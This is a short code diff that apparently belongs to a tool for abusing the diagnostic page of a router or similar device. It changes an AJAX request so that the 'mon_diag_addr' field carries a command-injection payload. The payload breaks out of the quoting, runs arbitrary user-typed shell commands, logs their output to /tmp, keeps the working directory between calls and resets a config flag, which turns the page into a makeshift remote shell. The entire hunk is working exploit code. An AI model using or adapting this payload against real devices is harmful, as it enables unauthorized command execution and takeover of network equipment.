@@ -29,7 +29,7 @@
                             page:"ajax.asp",
                             action:"save_monitor_diagnostic",
                             mon_diag_type:0,
-                            mon_diag_addr:'";echo "`' + this.value + ' 2>&1 `',
+                            mon_diag_addr:'";cd `cat /tmp/sh_dir`; ' + this.value + ' 2>&1 > /tmp/mon_diag.log 2>&1; pwd > /tmp/sh_dir; cmscfg -s -n mon_diag_status -v 0)& #',
                             mon_ping_num:1,
                             mon_ping_size:56,
                             mon_ping_timeout:10,
